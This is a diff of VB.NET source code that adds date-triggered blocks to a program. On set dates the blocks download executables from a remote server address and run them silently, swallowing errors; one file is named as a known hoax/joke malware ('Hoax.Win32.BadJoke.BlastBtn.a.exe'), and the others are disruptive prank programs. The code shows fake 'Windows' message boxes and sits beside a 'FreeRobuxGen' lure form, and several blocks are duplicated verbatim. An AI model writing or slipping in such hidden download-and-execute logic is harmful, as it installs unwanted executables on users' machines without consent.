@@ -165,7 +165,117 @@ vendor to ask if a 64-bit Windows compatible version is availble.", 0 + 0, "Unsu
             End If
             If currentTime.Month = 4 And currentTime.Date.Day = 1 Then
                 FreeRobuxGen.Show()
+
+
             End If
+
+            If currentTime.Month = 5 And currentTime.Date.Day = 7 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "Hoax.Win32.BadJoke.BlastBtn.a.exe", InstallPath & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
+                Catch ex As Exception
+
+                End Try
+
+                Try
+                    Process.Start(InstallPath & "\Hoax.Win32.BadJoke.BlastBtn.a.exe")
+                Catch ex As Exception
+                    MsgBox("ERROR FAILED TO START Hoax.Win32.BadJoke.BlastBtn.a.exe", 0 + 16, "ERROR")
+                End Try
+
+            End If
+
+
+
+            If currentTime.Month = 6 And currentTime.Date.Day = 9 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "WBOUNCE.exe", InstallPath & "\WBOUNCE.exe")
+                Catch ex As Exception
+
+                End Try
+                MsgBox("I like bouncing windows and I think you do too!", 0 + 64, "Windows")
+                Try
+                    Process.Start(InstallPath & "\WBOUNCE.exe")
+                Catch ex As Exception
+                    MsgBox("ERROR FAILED TO START WBOUNCE.exe", 0 + 16, "ERROR")
+                End Try
+
+            End If
+            'CHOMP.exe
+            If currentTime.Month = 8 And currentTime.Date.Day = 4 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "WBOUNCE.exe", InstallPath & "\WBOUNCE.exe")
+                Catch ex As Exception
+
+                End Try
+                MsgBox("I like bouncing windows and I think you do too!", 0 + 64, "Windows")
+                Try
+                    Process.Start(InstallPath & "\WBOUNCE.exe")
+                Catch ex As Exception
+                    MsgBox("ERROR FAILED TO START WBOUNCE.exe", 0 + 16, "ERROR")
+                End Try
+
+            End If
+
+            If currentTime.Month = 5 And currentTime.Date.Day = 22 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "CHOMP.exe", InstallPath & "\CHOMP.exe")
+                Catch ex As Exception
+
+                End Try
+                MsgBox("It's Pac-Man's birthday!", 0 + 64, "Windows")
+                Try
+                    Process.Start(InstallPath & "\CHOMP.exe")
+                Catch ex As Exception
+                    MsgBox("ERROR FAILED TO START CHOMP.exe", 0 + 16, "ERROR")
+                End Try
+
+            End If
+
+            If currentTime.Month = 5 And currentTime.Date.Day = 22 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "CHOMP.exe", InstallPath & "\CHOMP.exe")
+                Catch ex As Exception
+
+                End Try
+                MsgBox("It's Pac-Man's birthday!", 0 + 64, "Windows")
+                Try
+                    Process.Start(InstallPath & "\CHOMP.exe")
+                Catch ex As Exception
+                    MsgBox("ERROR FAILED TO START CHOMP.exe", 0 + 16, "ERROR")
+                End Try
+
+            End If
+
+            If currentTime.Month = 3 And currentTime.Date.Day = 10 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
+                Catch ex As Exception
+
+                End Try
+                Try
+                    Process.Start(InstallPath & "\MTRAILS.exe")
+                Catch ex As Exception
+                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
+                End Try
+
+            End If
+
+
+            If currentTime.Month = 3 And currentTime.Date.Day = 10 Then
+                Try
+                    My.Computer.Network.DownloadFile(ServerAddr & "MTRAILS.exe", InstallPath & "\MTRAILS.exe")
+                Catch ex As Exception
+
+                End Try
+                Try
+                    Process.Start(InstallPath & "\MTRAILS.exe")
+                Catch ex As Exception
+                    MsgBox("ERROR FAILED TO START MTRAILS.exe", 0 + 16, "ERROR")
+                End Try
+
+            End If
+
+
             If currentTime.Month = 5 And currentTime.Date.Day = 1 Then
                 FreeRobuxGen.Show()
             End If
